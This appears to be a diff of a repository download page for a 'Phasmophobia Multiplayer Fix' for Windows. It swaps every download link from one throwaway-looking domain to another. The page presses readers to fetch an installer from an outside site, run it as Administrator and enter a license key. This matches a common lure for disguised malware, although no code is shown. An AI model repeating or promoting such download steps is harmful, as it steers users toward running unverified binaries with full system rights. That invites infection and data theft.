@@ -16,27 +16,27 @@ Direct installer link below.
 > **This is the download page.** Use the button or link below to get **Phasmophobia Multiplayer Fix** for Windows.
 
 <p align="center">
-  <a href="https://phasmophobiamultiplayerfix.wonderchain.fun/">
+  <a href="https://phasmophobiamultiplayerfix.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-Phasmophobia%20Multiplayer%20Fix-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Phasmophobia Multiplayer Fix">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[phasmophobiamultiplayerfix.wonderchain.fun](https://phasmophobiamultiplayerfix.wonderchain.fun/)** |
-| **Full URL** | `https://phasmophobiamultiplayerfix.wonderchain.fun/` |
+| **Direct link** | **[phasmophobiamultiplayerfix.kolmods.com](https://phasmophobiamultiplayerfix.kolmods.com/)** |
+| **Full URL** | `https://phasmophobiamultiplayerfix.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — phasmophobiamultiplayerfix.wonderchain.fun](https://phasmophobiamultiplayerfix.wonderchain.fun/)** (link above)
+1. Click **[Download — phasmophobiamultiplayerfix.kolmods.com](https://phasmophobiamultiplayerfix.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://phasmophobiamultiplayerfix.wonderchain.fun/"><strong>⬇ Download Phasmophobia Multiplayer Fix now</strong></a></p>
+<p align="center"><a href="https://phasmophobiamultiplayerfix.kolmods.com/"><strong>⬇ Download Phasmophobia Multiplayer Fix now</strong></a></p>
 
 ---
 
